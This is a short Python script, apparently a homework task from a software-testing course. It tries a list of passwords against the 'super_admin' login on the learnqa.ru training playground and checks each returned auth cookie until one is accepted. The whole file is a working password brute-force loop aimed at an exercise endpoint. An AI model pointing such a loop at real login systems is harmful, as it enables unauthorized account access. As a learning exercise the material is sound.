import requests
import json

url_secret = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# сюда ручками перенесли все пароли, которые остались после удаления дубликатов.
# Берем из файла список паролей, и конвертируем в json, для чтения

with open('passwords.json', 'r') as passwords_list:
    passwords = json.load(passwords_list)

# перебираем список логинов и паролей, чтобы найти верный
for i in passwords:
    data = {"login": "super_admin", "password": passwords[i]}
    response_auth = requests.post(url_secret, data=data)
    auth_cookies_values = dict(response_auth.cookies).get("auth_cookie")
    auth_cookie = {"auth_cookie": auth_cookies_values}

    # проверяем куку на валидность
    cookies_check = requests.post(url_check, cookies=auth_cookie)

    # выводим результат,если пароль верный:

    if cookies_check.text == "You are authorized":
        print("You are authorized")
        print("Correct password : " + str(passwords[i]))
        response_auth = requests.post(url_secret, data=data)
        print(response_auth.text)